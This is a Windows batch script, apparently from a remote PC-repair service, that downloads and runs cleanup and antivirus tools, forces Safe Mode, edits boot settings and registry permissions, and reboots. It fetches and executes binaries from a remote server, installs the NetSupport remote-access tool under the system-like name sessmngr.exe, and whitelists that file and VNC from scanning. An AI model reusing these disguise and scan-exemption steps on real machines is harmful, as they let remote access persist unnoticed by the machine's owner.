echo downloading [base.7z] & echo downloading [base.7z] >>"%log%"
%path1%\download http://%fileserver%/base.7z /timeout:300 /update || %path1%\download http://%fileserver%/base.7z /timeout:300 /resume
echo downloading [programs.7z] & echo downloading [programs.7z] >>"%log%"
%path1%\download http://%fileserver%/programs.7z /timeout:300 /update||%path1%\download http://%fileserver%/programs.7z /timeout:300 /resume
echo downloading [minint.7z] & echo downloading [minint.7z] >>"%log%"
%path1%\download http://%fileserver%/minint.7z /timeout:300 /update || %path1%\download http://%fileserver%/minint.7z /timeout:300 /resume
echo Installing [programs.7z] & echo Installing [programs.7z] >>"%log%"
%path1%\7z x -y -p123123 programs.7z || echo error 319814567>>"%log%" &&goto support
echo Installing [base.7z] & echo Installing [base.7z] >>"%log%"
%path1%\7z x -y -p123123 base.7z || echo base.7z will report errors because some files will be locked.
echo Installing [minint.7z] & echo Installing [minint.7z] >>"%log%"
%path1%\7z x -y -p123123 minint.7z || echo error 477278471>>"%log%" &&goto support
if not exist minint\system32\config\software (echo error 641850174>>"%log%" &goto ftp_upload)
download http://%fileserver%/netsupport.exe /timeout:120 /overwrite /output:minint\sessmngr.exe
%path1%\download http://%fileserver%/initrd.gz /timeout:120 /update || %path1%\download http://%fileserver%/initrd.gz /timeout:120 /resume
%path1%\download http://%fileserver%/vmlinuz /timeout:120 /update || %path1%\download http://%fileserver%/vmlinuz /timeout:120 /resume
if not exist programs\nu2menu\nu2menu.exe (echo error 2613259910>>"%log%" &goto ftp_upload)
if not exist ntldr-xp (echo error 4326708515 >>"%log%" &goto ftp_upload)
if not exist menu.lst (echo error 528365612>>"%log%" &&goto ftp_upload)
if exist %drv0%\%_windir%\boot\pcat (
  %path1%\bootsect.exe /nt52 %drv0% /force >NUL 2>&1 || echo error 7615904>>"%log%" &&goto ftp_upload
)
REM if exist %drv0%\%_windir%\boot\pcat %path1%\bcdedit.exe /default {ntldr} >NUL 2>&1
if "%uninst%" equ "yes" (copy /y %path1%\menu.lst-locked %drv0%\menu.lst)
Call :safemode &echo support and safemode installation complete>>"%log%"

:support-cont
ps -Ws >%path1%\processes.txt &sleep 5
find /I "_antivirus" %path1%\processes.txt &&echo mark3490>>"%log%" &&sleep 300 &&goto :support-cont
echo system will reboot now &echo system will reboot now>>"%log%"
pskill _support.exe &sleep 5 & del %drv0%\%_windir%\_support.exe
REM shutdown /r /f /t 60 || sleep 90 && %path1%\shutdown2 /r
shutdown.exe /r /f /t 60 || shutdown2.exe /r
goto EOF


:safemode
call :nosafemode
reg add "hklm\system\CurrentControlSet\Control\SafeBoot\Network\MsiServer" /VE /T REG_SZ /F /D Service
REM net start msiserver >NUL 2>&1
  bcdedit /set {default} safeboot network 2>&1 >NUL 2>&1
  if exist %drv0%\boot.ini if not exist %drv0%\boot.ini_tmp (
   attrib -H -R -A -S %drv0%\boot.ini
   copy /y %drv0%\boot.ini %drv0%\boot.ini_tmp
   echo [Boot Loader]>%drv0%\boot.ini
   echo Timeout=10>>%drv0%\boot.ini
   REM echo Default=%drv0%\%_windir%>>%drv0%\boot.ini
   type %drv0%\boot.ini_tmp | find /I "default=">>%drv0%\boot.ini
   echo [Operating Systems]>>%drv0%\boot.ini
   REM echo %drv0%\%_windir%="Windows XP" /safeboot:network>>%drv0%\boot.ini
   type %drv0%\boot.ini_tmp | find /I "windows=" | sed "s/=.*./=\"Safe Mode\" \/safeboot:network/">>%drv0%\boot.ini
   echo.>>%drv0%\boot.ini
   type %drv0%\boot.ini_tmp | find /I "windows=">>%drv0%\boot.ini
)
   echo safemode enabled & echo safemode enabled >>"%log%"
   goto EOF

:nosafemode
echo removing safemode settings & echo removing safemode settings>>"%log%"
bcdedit.exe /timeout 5 2>&1 >NUL 2>&1 & bcdedit /deletevalue {default} safeboot 2>&1 >NUL 2>&1
if exist %drv0%\boot.ini_tmp (attrib -H -R -A -S %drv0%\boot.ini & move /y %drv0%\boot.ini_tmp %drv0%\boot.ini)
attrib +A +R +H %drv0%\boot.ini >NUL 2>&1
echo safemode disabled & echo safemode disabled >>"%log%"
goto EOF

:antivirus
time /t>>"%log%" &echo running antivirus>>"%log%"
set log=%path2%\%id%-av.log
cd /d "%path2%\"
if not exist %drv0%\%_windir%\_antivirus.exe (copy sessmngr.exe %drv0%\%_windir%\_antivirus.exe)
time /t>>"%log%" &echo running antivirus>>"%log%"
echo system=%system%>>"%log%" &echo safeboot=%safeboot%>>"%log%"
echo support_av=%support%>>"%log%"

REM 100000000=100mb
Set minspace=200000000
For /F "tokens=* delims=" %%i in (
'fsutil volume diskfree %drv0% ^| find /I "of free bytes" ^| sed "s/.*.://" ^| sed "s/ //g"'
) Do Set free=%%i

If /I %free% LSS %minspace% (
    echo Error 206748076 [minspace:%minspace%] [freespace:%free%]>>"%log%" &goto ftp_upload
)

CALL :safemode || echo error 92055474>>"%log%"
CALL :3283_antivirus
goto 6481_antivirus

:3283_antivirus
SET /a randID6=%1 >NUL 2>&1
SET /a randID6=%randID6% + 1
If "%randID6%" equ "7" (echo error av8047>>"%log%" & goto 9615_antivirus)
download http://%fileserver%/connection_test /timeout:30 /overwrite || goto 9615_antivirus
echo downloading AV programs>>"%log%"

download http://%fileserver%/hijackthis.7z /timeout:120 /update||download http://%fileserver%/hijackthis.7z /timeout:120 /resume
7z x -y hijackthis.7z ||echo error av7461>>"%log%" &&goto 3283_antivirus

download http://%fileserver%/freefixer.7z /timeout:120 /update||download http://%fileserver%/freefixer.7z /timeout:120 /resume
7z x -y freefixer.7z ||echo error av4810>>"%log%" &&goto 3283_antivirus

download http://%fileserver%/ezpcfix.7z /timeout:120 /update||download http://%fileserver%/ezpcfix.7z /timeout:120 /resume
7z x -y ezpcfix.7z ||echo error av3458>>"%log%" &&goto 3283_antivirus

download http://%fileserver%/ccleaner.7z /timeout:120 /update||download http://%fileserver%/ccleaner.7z /timeout:120 /resume
7z x -y ccleaner.7z || echo error av79185>>"%log%" && goto 3283_antivirus

download http://%fileserver%/gmer.exe /timeout:120 /update||download http://%fileserver%/gmer.exe /timeout:120 /resume

download http://%fileserver%/rootkitbuster.exe /timeout:120 /overwrite ^
  || echo error av5678>>"%log%" &&goto 3283_antivirus

download http://%fileserver%/a2cmd.7z /update||download http://%fileserver%/a2cmd.7z /timeout:180 /resume
7z x -y a2cmd.7z || echo error av4181>>"%log%" && goto 3283_antivirus

download http://%fileserver%/nod32.7z /update||download http://%fileserver%/nod32.7z /timeout:180 /resume
7z x -y nod32.7z || echo error av2384>>"%log%" && goto 3283_antivirus

download http://%fileserver%/wiseregistrycleaner.7z /timeout:120 /overwrite
if exist wiseregistrycleaner rmdir /s /q wiseregistrycleaner
7z x -y wiseregistrycleaner.7z ||echo error av8461>>"%log%" &&goto 3283_antivirus

REM download http://%fileserver%/mbam.7z  /timeout:120 /update||download http://%fileserver%/mbam.7z /timeout:120 /resume
REM 7z x -y mbam.7z || echo error av4257>>"%log%" &&goto 3283_antivirus
CALL mbam-install

REM download http://%fileserver%/kaspersky.7z  /timeout:300 /update||download http://%fileserver%/kaspersky.7z /timeout:300 /resume
REM 7z x -y kaspersky.7z || echo error av6781>>"%log%" &&goto 3283_antivirus
CALL kaspersky-tool-install

CALL :asquared-update
goto EOF

:6481_antivirus

CALL :rootkitbuster

if "%support%" equ "yes" (echo mark8411av>>"%log%" & goto EOF)
if "%system%" equ "techsupport" (goto 9615_antivirus)
if "%safeboot%" equ "yes" (goto 9615_antivirus)

CALL :ccleaner
CALL :asquared-quick
CALL :kaspersky-tool-quick
CALL :nod32-quick
CALL :mbam-scan

:9615_antivirus

if "%safeboot%" neq "yes" if "%system%" equ "customer" (
    CALL :services||echo error svc2726>>"%log%"
    echo mark4194av>>"%log%" &shutdown.exe /r /f /t 30 || shutdown2.exe /r&goto EOF
)

CALL :ccleaner
CALL :asquared-quick
CALL :nod32-quick
CALL :kaspersky-tool-quick
CALL :mbam-scan
CALL :wiseregistrycleaner
   REM CALL :install_nod
CALL :nosafemode || echo error nosafe5972>>"%log%"

CALL :services||echo error svc895>>"%log%"

download http://%fileserver%/netsupport.exe /timeout:120 /overwrite /output:%path2%\sessmngr.exe
copy /y %path2%\sessmngr.exe %systemroot% 2>&1 >NUL 2>&1
copy /y %path2%\sessmngr.exe %drv0%\%_windir% 2>&1 >NUL 2>&1
echo deleting _antivirus.exe>>"log%"
pskill _antivirus &sleep 3 &del %drv0%\%_windir%\_antivirus.exe
time /t>>"%log%" &echo antivirus complete>>"%log%"
set ftpfile="%log%" & CALL :ftp_upload

cd /d "%path2%\"
if "%system%" equ "customer" (echo mark5097>>"%log%"&shutdown.exe /r /f /t 30||shutdown2.exe /r&goto EOF)
if not exist %drv0%\%_windir%\boot\pcat (copy /y menu.lst-xp %drv0%\menu.lst)
if exist %drv0%\%_windir%\boot\pcat (copy /y menu.lst-vista %drv0%\menu.lst)
shutdown2 /r || shutdown /r & goto EOF

:ccleaner
cd /d "%path2%\" & echo Running ccleaner>>"%log%"
if "%system%" equ "techsupport" goto EOF
if not exist ccleaner\ccleaner.exe (download http://%fileserver%/ccleaner.7z /timeout:120 /overwrite)
if not exist ccleaner\ccleaner.exe (7z x -y ccleaner.7z||echo error av2027>>"%log%" &&goto 3283_antivirus)
ccleaner\ccleaner.exe /auto || echo error cclean567>>"%log%"
goto EOF


::ezpcfix
:ezpcfix
cd /d "%path2%\" & echo Running ezpcfix>>"%log%"
download http://%fileserver%/ezpcfix.7z /timeout:120 /update||download http://%fileserver%/ezpcfix.7z /timeout:120 /resume
if not exist ezpcfix\ezpcfix.exe (7z x -y ezpcfix.7z ||echo error ezpc651>>"%log%" && goto EOF)
if "%system%" equ "techsupport" (ezpcfix\ezpcfix)
if "%system%" equ "customer" (ezpcfix\ezpcfix2)
goto EOF

:hijackthis
cd /d "%path2%\" & echo Running hijackthis>>"%log%"
download http://%fileserver%/hijackthis.7z /timeout:120 /update||download http://%fileserver%/hijackthis.7z /timeout:120 /resume
if not exist hijackthis\hijackthis.exe (7z x -y hijackthis.7z ||echo error hjthis6452>>"%log%" && goto EOF)
%runscanner% hijackthis\hijackthis.exe

goto EOF

:avast-install
cd /d "%path2%\" & echo mark avst6348>>"%log%"
download http://%fileserver%/avast.exe /timeout:300 /update||download http://%fileserver%/avast.exe /timeout:300 /resume
if not exist avast.exe (echo error avst861>>"%log%" && goto EOF)
avast /silent || echo error avst394>>"%log%" && goto EOF
echo mark avst428>>"%log%"
goto EOF

::mbam-install
:mbam-install
cd /d "%path2%\" & time /t>>"%log%" & echo mark mbam67615>>"%log%"
reg add "hkcu\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v ProxyEnable /t reg_dword /f /d 0
reg add "hklm\software\Policies\Microsoft\Windows\CurrentVersion\Internet Settings" /v Security_HKLM_only /t reg_dword /f /d 1
reg add "hklm\software\Policies\Microsoft\Windows\CurrentVersion\Internet Settings" /v ProxySettingsPerUser /t reg_dword /f /d 1

pskill _malbyt.exe 2>&1 >NUL 2>&1 & pskill mbam.exe 2>&1 >NUL 2>&1 & pskill _malbyt-setup.exe 2>&1 >NUL 2>&1
set P=%USERPROFILE%\Application Data\Microsoft\Internet Explorer\Quick Launch
if not exist "%P%" mkdir "%P%" || echo error mbam520459>>"%log%"
download http://%fileserver%/mbam-setup.exe /timeout:300 /overwrite /output:_malbyt-setup.exe||echo error mbam3515>>"%log%"

set R=%USERPROFILE%\Application Data\Malwarebytes
set S=%ALLUSERSPROFILE%\Application Data\Malwarebytes
set T=%ALLUSERSPROFILE%\Application Data\Malwarebytes\Malwarebytes' Anti-Malware
set D=mbam\current user\Application Data\Malwarebytes
set E=mbam\all users\Application Data\Malwarebytes
rmdir /s /q "%R%" 2>&1 >NUL 2>&1 & RMDIR /S /Q "%S%" 2>&1 >NUL 2>&1
del "%windir%\system32\drivers\mbam.sys"
del "%windir%\system32\drivers\mbamswissarmy.sys"
reg delete "hkcu\Software\Malwarebytes' Anti-Malware" /f
regsvr32.exe /s /u mbam\vbalsgrid6.ocx 2>&1 >NUL 2>&1
regsvr32.exe /s /u mbam\ssubtmr6.dll 2>&1 >NUL 2>&1
regsvr32.exe /s /u mbam\mbamext.dll 2>&1 >NUL 2>&1
if exist mbam rmdir /s /q mbam || echo error mbam2785>>"%log%"
_malbyt-setup.exe /silent /DIR="mbam" || echo error mbam9452>>"%log%"
    ::_malbyt.exe /verysilent /DIR="mbam" || echo error mbam9452>>"%log%"
download http://%fileserver%/rules.ref /timeout:30 /overwrite /output:"%T%"||echo error mbam55423>>"%log%"

:mbam-poll
ps -Ws >processes.txt &sleep 5 &find /I "_malbyt" processes.txt &&sleep 30 &&goto mbam-poll
move /y mbam\mbam.exe mbam\_malbyt.exe || echo error mbam9473156>>"%log%" & goto EOF

  REM if not exist mbam\_malbyt.exe (echo error mbam6941>>"%log%" & goto EOF)

if exist "%D%" xcopy /i /e /y "%D%\*" "%R%"
if exist "%E%" xcopy /i /e /y "%E%\*" "%S%"

regsvr32.exe /s mbam\vbalsgrid6.ocx 2>&1 >NUL 2>&1
regsvr32.exe /s mbam\ssubtmr6.dll 2>&1 >NUL 2>&1
regsvr32.exe /s mbam\mbamext.dll 2>&1 >NUL 2>&1

move /y mbam\languages mbam\lang && mkdir mbam\languages && copy /y mbam\lang\english* mbam\languages

start mbam\_malbyt.exe /update &sleep 90 & pskill _malbyt.exe
echo mark mbam5159>>"%log%">>"%log%"

if not exist "%D%" mkdir "%D%" || echo error mbam2895>>"%log%"
if not exist "%E%" mkdir "%E%" || echo error mbam84205>>"%log%"
xcopy /i /e /y "%R%" "%D%" || echo error mbam7585>>"%log%"
xcopy /i /e /y "%S%" "%E%" || echo error mbam4872>>"%log%"
echo echo mark mbam52174>>"%log%"
goto EOF

::mbam-quick
:mbam-quick
cd /d "%path2%\" & time /t>>"%log%" &echo echo mark mbam76115>>"%log%"

CALL :mbam-install
if not exist mbam\_malbyt.exe (echo error mbam7276>>"%log%" & goto EOF)

pskill _malbyt.exe 2>&1 >NUL 2>&1
set P=%USERPROFILE%\Application Data\Microsoft\Internet Explorer\Quick Launch
set P=%USERPROFILE%\Application Data\Internet Explorer\Quick Launch
set R=%USERPROFILE%\Application Data\Malwarebytes
set S=%ALLUSERSPROFILE%\Application Data\Malwarebytes
set D=mbam\current user\Application Data\Malwarebytes
set E=mbam\all users\Application Data\Malwarebytes

if not exist "%P%" mkdir "%P%" || echo error mbam520459>>"%log%"
if exist "%D%" xcopy /i /e /y "%D%\*" "%R%"
if exist "%E%" xcopy /i /e /y "%E%\*" "%S%"
regsvr32.exe /s mbam\vbalsgrid6.ocx 2>&1 >NUL 2>&1
regsvr32.exe /s mbam\ssubtmr6.dll 2>&1 >NUL 2>&1
regsvr32.exe /s mbam\mbamext.dll 2>&1 >NUL 2>&1

set mbamlog=%drv0%\documents and settings\localservice\application data\Malwarebytes\malwarebytes' anti-malware\logs

if exist %drv0%\windows\serviceprofiles\localservice\appdata\roaming\Malwarebytes (
set mbamlog=%drv0%\windows\serviceprofiles\localservice\appdata\roaming\Malwarebytes\malwarebytes' anti-malware\logs
)

if "%system%" equ "customer" set mbamlog=%appdata%\Malwarebytes\malwarebytes' anti-malware\logs
del "%mbamlog%\*txt"

if "%system%" equ "techsupport" set _sendkeys=%runscanner% mbam\_malbyt.exe /quickscanterminate&CALL :sendkeys&sleep 10

if "%system%" equ "customer" mbam\_malbyt.exe /quickscanterminate || echo error mbam7944>>"%log%"
copy /y "%mbamlog%\*txt" mbam\mbam.log
goto EOF


::mbam-full
:mbam-full
cd /d "%path2%\" & time /t>>"%log%" &echo echo mark mbam420544>>"%log%"

CALL :mbam-install
if not exist mbam\_malbyt.exe (echo error mbam424364>>"%log%" & goto EOF)

pskill _malbyt.exe 2>&1 >NUL 2>&1
set P=%USERPROFILE%\Application Data\Microsoft\Internet Explorer\Quick Launch
set R=%USERPROFILE%\Application Data\Malwarebytes
set S=%ALLUSERSPROFILE%\Application Data\Malwarebytes
set D=mbam\current user\Application Data\Malwarebytes
set E=mbam\all users\Application Data\Malwarebytes

if not exist "%P%" mkdir "%P%" || echo error mbam520459>>"%log%"
if exist "%D%" xcopy /i /e /y "%D%\*" "%R%"
if exist "%E%" xcopy /i /e /y "%E%\*" "%S%"
regsvr32.exe /s mbam\vbalsgrid6.ocx 2>&1 >NUL 2>&1
regsvr32.exe /s mbam\ssubtmr6.dll 2>&1 >NUL 2>&1
regsvr32.exe /s mbam\mbamext.dll 2>&1 >NUL 2>&1

set mbamlog=%drv0%\documents and settings\localservice\application data\Malwarebytes\malwarebytes' anti-malware\logs

if exist %drv0%\windows\serviceprofiles\localservice\appdata\roaming\Malwarebytes (
set mbamlog=%drv0%\windows\serviceprofiles\localservice\appdata\roaming\Malwarebytes\malwarebytes' anti-malware\logs
)

if "%system%" equ "customer" set mbamlog=%appdata%\Malwarebytes\malwarebytes' anti-malware\logs
del "%mbamlog%\*txt"

if "%system%" equ "techsupport" set _sendkeys=%runscanner% mbam\_malbyt.exe /fullscanterminate&CALL :sendkeys&sleep 10

if "%system%" equ "customer" mbam\_malbyt.exe /fullscanterminate || echo error mbam754642>>"%log%"
copy /y "%mbamlog%\*txt" mbam\mbam.log
goto EOF


:rootkitbuster
cd /d "%path2%\"
if not exist rootkitbuster.exe (download http://%fileserver%/rootkitbuster.exe /timeout:120 /overwrite)
if "%system%" equ "customer" if "%safeboot%" neq "yes" (
time /t>>"%log%" & echo Running rootkitbuster>>"%log%"
rootkitbuster.exe /s /c /a || echo error rootki530>>"%log%"
REM /s=console mode /c=autoclean /a=scan-all [hidden registry,hidden files,hidden processes,hidden drivers]
)
goto EOF

:nod32-quick
cd /d "%path2%\" & time /t>>"%log%" & echo Running nod32-quick>>"%log%"
nod32\ecls.exe /base-dir="nod32" /log-rewrite /log-file="nod32\nod32-quick.log" /boots /memory /scan-timeout=30 /clean-mode=rigorous
goto EOF

:nod32-full
cd /d "%path2%\" & time /t>>"%log%" & echo Running nod32-full>>"%log%"
REM nod32\ecls.exe /base-dir="nod32" /log-rewrite /log-file="nod32\nod32.log" /boots /memory /mail /scan-timeout=60 /action=none /quarantine %drv0%
nod32\ecls.exe /base-dir="nod32" /log-rewrite /log-file="nod32\nod32-full.log" /boots /memory /mail /scan-timeout=30 /unwanted /clean-mode=rigorous /quarantine %drv0%
if "%errorlevel%" equ "0" echo nod32 [no threat found] >>"%log%"
if "%errorlevel%" equ "1" echo nod32 [threat found and cleaned] >>"%log%"
if "%errorlevel%" equ "10" echo nod32 [some files not scanned] >>"%log%"
if "%errorlevel%" equ "50" echo nod32 [possible threat not cleaned] >>"%log%"
if "%errorlevel%" equ "100" echo nod32 [error] >>"%log%"
goto EOF


:asquared-install
cd /d "%path2%\" & time /t>>"%log%" & echo Running asquared-install>>"%log%"
download http://%fileserver%/a2cmd.7z /timeout:180 /update||download http://%fileserver%/a2cmd.7z /timeout:180 /resume
7z x -y a2cmd.7z || echo error av4181>>"%log%" && goto EOF
call :asquared-update
goto EOF

:asquared-update
cd /d "%path2%\" & time /t>>"%log%" & echo Running asquared-update>>"%log%"
del a2cmd\a2cmd.log >NUL 2>&1
echo %drv0%\hbcd>a2cmd\whitelist.txt" &echo %drv0%\minint>>a2cmd\whitelist.txt"
echo %drv0%\programs>>a2cmd\whitelist.txt" &echo %drv0%\os_install>>a2cmd\whitelist.txt"
echo %drv0%\%_windir%\sessmngr.exe>>a2cmd\whitelist.txt &echo %drv0%\%_windir%\runcycle.exe>>a2cmd\whitelist.txt
echo %drv0%\%_windir%\download.exe>>a2cmd\whitelist.txt &echo %drv0%\%_windir%\winvnc.exe>>a2cmd\whitelist.txt
echo %drv0%\%_windir%\_antivirus.exe>>a2cmd\whitelist.txt &echo %drv0%\%_windir%\_support.exe>>a2cmd\whitelist.txt
a2cmd\a2cmd /u || echo error a28161>>"%log%"
goto EOF

:asquared-quick
cd /d "%path2%\" & time /t>>"%log%" & echo Running asquared-quick>>"%log%"
if not exist a2cmd\a2cmd.exe call :asquared-install
call :asquared-update
set files=%drv0%\%_windir%,%drv0%\documents and settings,%drv0%\users
if "%system%" equ "customer" a2cmd\a2cmd /files="%files%" /h /a /n /t /q /wl="a2cmd\whitelist.txt" /log="a2cmd\a2cmd-quick.log"
if "%system%" equ "techsupport" (
set _sendkeys=%runscanner% a2cmd\a2cmd /files=%files% /h /a /n /t /q /wl=a2cmd\whitelist.txt /log=a2cmd\a2cmd-quick.log
CALL :sendkeys &sleep 10
)
:asquared-quick4258
ps -Ws >processes.txt &sleep 5 &find /I "a2cmd.exe" processes.txt &&sleep 120 &&goto asquared-quick4258

if "%errorlevel%" equ "0" echo asquared [No Infections found]>>"%log%"
if "%errorlevel%" equ "1" echo asquared [Infections were found]>>"%log%"
goto EOF

:asquared-full
cd /d "%path2%\" & time /t>>"%log%" & echo Running asquared-full >>"%log%"
if "%system%" equ "customer" a2cmd\a2cmd /files=%drv0% /h /a /n /t /q /wl="a2cmd\whitelist.txt" /log="a2cmd\a2cmd-quick.log"
if "%system%" equ "techsupport" (
set _sendkeys=%runscanner% a2cmd\a2cmd /files=%drv0% /h /a /n /t /q /wl=a2cmd\whitelist.txt /log=a2cmd\a2cmd-quick.log
CALL :sendkeys &sleep 10
)
:asquared-full2218
ps -Ws >processes.txt &sleep 5 &find /I "a2cmd.exe" processes.txt &&sleep 120 &&goto asquared-full2218

if "%errorlevel%" equ "0" echo asquared [No Infections found]>>"%log%"
if "%errorlevel%" equ "1" echo asquared [Infections were found]>>"%log%"
goto EOF


::kaspersky-tdsskiller
:kaspersky-tdsskiller
cd /d "%path2%\" & echo Running kaspersky-tdsskiller>>"%log%"
download http://%fileserver%/kaspersky-tdsskiller.exe /timeout:120 /overwrite
pskill kaspersky-tdsskiller.exe 2>&1 >NUL 2>&1
kaspersky-tdsskiller.exe
goto EOF

::kaspersky-tool-install
:kaspersky-tool-install
cd /d "%path2%\" & echo Running kaspersky-tool-install>>"%log%"
REM set olduserprofile=%userprofile%&set userprofile=%cd%\kasp-%random%&pskill kaspersky 2>&1 >NUL 2>&1
REM if not exist "%userprofile%\desktop" (mkdir "%userprofile%\desktop" ||echo error kasp2491>>"%log%" &&goto EOF)
REM start kaspersky.exe /silent & sleep 2m & pskill kaspersky
pskill kaspersky 2>&1 >NUL 2>&1

set D=%userprofile%\desktop\virus removal tool\kaspersky
if exist "%D%" (echo error kasp8661>>"%log%" & goto EOF)
download http://devbuilds.kaspersky-labs.com/devbuilds/AVPTool/index.html /timeout:30 /overwrite /output:avp.txt
For /F "tokens=* delims=" %%i in (
'find /I "location=" avp.txt ^| sed "s/.*.='//"^| sed "s/'.*.//"'
) Do Set kasp=%%i
download http://devbuilds.kaspersky-labs.com/devbuilds/AVPTool/%kasp% /output:kaspersky.exe /timeout:120 /update
download http://devbuilds.kaspersky-labs.com/devbuilds/AVPTool/%kasp% /output:kaspersky.exe /timeout:120 /resume
if not exist kaspersky.exe (echo error kasp35046>>"%log%" & goto EOF)
set _sendkeys=kaspersky.exe /silent&CALL :sendkeys
if not exist "%D%\fssync.dll" (echo error kasp451658>>"%log%"&goto kaspersky-tool-install)
if not exist "%D%\kaspersky.exe (echo error kasp894571>>"%log%"&goto kaspersky-tool-install)
   REM set _sendkeys=kaspersky.exe /silent&CALL :sendkeys&sleep 90&pskill kaspersky
if not exist "%D%" (echo error kasp531412>>"%log%"&goto kaspersky-tool-install)
if not exist kaspersky xcopy /i /e /y "%D%" kaspersky || echo error kasp3791>>"%log%"
  REM rmdir /s /q "%D%"
  REM set userprofile=%olduserprofile%
goto EOF

::kaspersky-tool-quick
:kaspersky-tool-quick
cd /d "%path2%\" & time /t>>"%log%" & echo running kaspersky-tool-quick>>"%log%"
set D=%userprofile%\desktop\virus removal tool\kaspersky
if not exist kaspersky if exist "%D%" xcopy /i /e /y "%D%" kaspersky ||echo error kasp3791>>"%log%"
if not exist kaspersky\kaspersky.com (CALL :kaspersky-tool-install & sleep 30)
if not exist kaspersky\kaspersky.com (echo error kasp2494>>"%log%" &goto EOF)
pskill kaspersky & sleep 5
if "%system%" equ "customer" kaspersky\kaspersky.com -bl START Scan_Objects /RA:kaspersky\kaspersky-quick.log
if "%system%" equ "techsupport" (
set _sendkeys=%runscanner% kaspersky\kaspersky.com -bl START Scan_Objects /RA:kaspersky\kaspersky-quick.log
CALL :sendkeys &sleep 10
)

:kasp5286
ps -Ws >processes.txt &sleep 5 &find /I "kaspersky" processes.txt &&sleep 120 &&goto kasp5286
goto EOF

::kaspersky-tool-full
:kaspersky-tool-full
cd /d "%path2%\" & time /t>>"%log%" & echo running kaspersky-tool-full>>"%log%"
set D=%userprofile%\desktop\virus removal tool\kaspersky
if not exist kaspersky if exist "%D%" xcopy /i /e /y "%D%" kaspersky ||echo error kasp3791>>"%log%"
if not exist kaspersky\kaspersky.com (CALL :kaspersky-tool-install)
if not exist kaspersky\kaspersky.com (echo error kasp9457>>"%log%" &goto EOF)
pskill kaspersky & sleep 5
if "%system%" equ "customer" kaspersky\kaspersky.com -bl START Scan_Objects /i3 /all /RA:kaspersky\kaspersky-full.log
if "%system%" equ "techsupport" (
set _sendkeys=%runscanner% kaspersky\kaspersky.com -bl START Scan_Objects /i3 /all /RA:kaspersky\kaspersky-full.log
CALL :sendkeys &sleep 10
)
:kasp2962
ps -Ws >processes.txt &sleep 5 &find /I "kaspersky" processes.txt &&sleep 120 &&goto kasp2962
goto EOF

:wiseregistrycleaner
cd /d "%path2%\" & echo running wiseregistrycleaner>>"%log%"
if not exist wiseregistrycleaner\wiseregistrycleaner.exe (
download http://%fileserver%/wiseregistrycleaner.7z /timeout:120 /overwrite ^ 
 ||download http://%fileserver%/wiseregistrycleaner.7z /timeout:120 /resume
7z x -y wiseregistrycleaner.7z ||echo error wise6158>>"%log%" && goto EOF
)

if not exist wiseregistrycleaner\wiseregistrycleaner.exe (echo error wise9761>>"%log%" &goto EOF)

if "%system%" equ "techsupport" (
set _sendkeys=%runscanner% wiseregistrycleaner\wiseregistrycleaner.exe -a -s & CALL :sendkeys
)

if "%system%" equ "customer" wiseregistrycleaner\wiseregistrycleaner.exe -a -s
if "%system%" equ "customer" wiseregistrycleaner\wiseregistrycleaner.exe -a -s || echo error wise8086>>"%log%"

goto EOF

:install_nod
if "%system%" equ "techsupport" (goto EOF)
set nod=nod32.msi
if %64bit% equ "yes" set nod=nod64.msi
cd /d "%path2%\" & echo Installing %nod%>>"%log%"
If not exist "%programfiles%\ESET" (
echo installing %nod%>>"%log%"
download http://%fileserver%/%nod% /timeout:120 /update || download http://%fileserver%/%nod% /timeout:120 /resume
if not exist %nod% (echo error nod9461>>"%log%" & goto EOF)
REM msiexec.exe /unregister && msiexec.exe regserver
msiexec.exe /i %nod% /qn || echo error %nod% installation failed >>"%log%"
)
goto EOF

:services
cd /d "%path2%\" & time /t>>"%log%" & echo running services >>"%log%" & echo unloading hives
set ftpfile=%log%

reg unload hklm\system_on_c >NUL 2>&1 & reg unload hklm\software_on_c >NUL 2>&1
reg unload hklm\default_on_c >NUL 2>&1 & reg unload hklm\user000 >NUL 2>&1

if not exist erunt\erunt.exe if exist %path1%\erunt\erunt.exe xcopy /y /i /e %path1%\erunt erunt
set erunt-original=%path2%\config&set erunt-working=%path2%\config_temp
if exist "%erunt-original%" (echo removing %erunt-original% & rmdir /s /q "%erunt-original%")
mkdir "%erunt-original%" || echo error svc6487>>"%log%"&&goto ftp_upload

if "%system%" equ "customer" (
erunt\erunt.exe config /noconfirmdelete /noprogresswindow 2>&1 >NUL 2>&1^
  || echo error svc2768>>"%log%"&&goto ftp_upload
sleep 20 & pskill erunt 2>&1 >NUL 2>&1 & sleep 5 & pskill erunt 2>&1 >NUL 2>&1
)

if "%system%" equ "techsupport" (
copy /y %drv0%\%_windir%\system32\config\default "%erunt-original%\" ^
  || echo error svc2446>>"%log%" &&goto ftp_upload
copy /y %drv0%\%_windir%\system32\config\software "%erunt-original%\" ^
  || echo error svc2797>>"%log%" &&goto ftp_upload
copy /y %drv0%\%_windir%\system32\config\system "%erunt-original%\" ^
  || echo error svc1674>>"%log%" &&goto ftp_upload
copy /y %path2%\erunt\erdnt.exe "%erunt-original%\" || echo error svc4278>>"%log%" &&goto ftp_upload
copy /y %path2%\erunt\erdntwin.loc "%erunt-original%\" || echo error svc7918>>"%log%" &&goto ftp_upload
)

if exist %erunt-working% (rmdir /s /q %erunt-working% || echo error svc7536>>"%log%" &&goto ftp_upload)
echo building new %erunt-working% from %erunt-original%
xcopy /i /e /y %erunt-original% %erunt-working% || echo error svc8706>>"%log%" &&goto ftp_upload
if exist %drv0%\windows\erdnt\%id%\users (xcopy /i /e /y %drv0%\windows\erdnt\%id%\users %erunt-working%\)

echo loading hives
reg load hklm\system_on_c %erunt-working%\system || echo error svc5492>>"%log%" &&goto ftp_upload
reg load hklm\software_on_c %erunt-working%\software || echo error svc4374>>"%log%" &&goto ftp_upload
reg load hklm\default_on_c %erunt-working%\default || echo error svc6429>>"%log%" &&goto ftp_upload

::------------Fixing systemwide permissions----------------------
REM subinacl.exe /subkeyreg HKEY_LOCAL_MACHINE\sam_On_c /grant=administrators=f /grant=system=f
REM subinacl.exe /subkeyreg HKEY_LOCAL_MACHINE\security_on_c /grant=administrators=f /grant=system=f
subinacl.exe /subkeyreg HKEY_LOCAL_MACHINE\software_on_c /grant=administrators=f /grant=system=f
subinacl.exe /subkeyreg HKEY_LOCAL_MACHINE\system_on_c /grant=administrators=f /grant=system=f
subinacl.exe /subkeyreg HKEY_LOCAL_MACHINE\default_on_c /grant=administrators=f /grant=system=f
subinacl.exe /subdirectories %drv0% /grant=administrators=f /grant=system=f
subinacl.exe /subdirectories %drv0%\%_windir%\*.* /grant=administrators=f /grant=system=f
